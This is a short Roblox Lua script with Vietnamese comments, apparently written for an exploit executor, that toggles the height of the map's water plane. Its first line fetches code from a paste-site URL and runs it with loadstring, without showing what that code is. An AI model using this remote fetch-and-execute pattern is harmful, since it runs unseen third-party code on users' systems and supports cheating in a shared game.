-- Execute the script from the URL
loadstring(game:HttpGet("https://pastefy.app/kTvdratR/raw"))()
print("run r")
-- Set the value for _G.NuocLon
_G.NuocLon = true  -- You can change this to true or false depending on your need

-- Continuous check for _G.NuocLon and adjust the size of "WaterBase-Plane"
spawn(function()
    while task.wait() do
        pcall(function()
            if _G.NuocLon then
                game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000, 112, 1000)
            else
                game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000, 80, 1000)
            end
        end)
    end
end)

-- Detect when a player joins the game
game.Players.PlayerAdded:Connect(function(player)
    print(player.Name .. " has joined the game.")  -- Tự động lấy tên người chơi
    
    -- Thiết lập giá trị _G.NuocLon dựa trên tên người chơi
    if player.Name == "Player123" then  -- Bạn có thể thay đổi điều kiện này tùy ý
        _G.NuocLon = true
    else
        _G.NuocLon = false
    end
end)

-- Detect when a player touches a specific part
local part = game.Workspace.Part -- Thay bằng phần bạn muốn kiểm tra

part.Touched:Connect(function(hit)
    local player = game.Players:GetPlayerFromCharacter(hit.Parent)
    
    if player then
        print(player.Name .. " touched the part!")  -- Tự động lấy tên người chơi khi chạm vào phần
        -- Tạo hành động khi người chơi chạm vào phần, ví dụ thay đổi giá trị _G.NuocLon
        _G.NuocLon = not _G.NuocLon  -- Đảo ngược giá trị _G.NuocLon
    end
end)
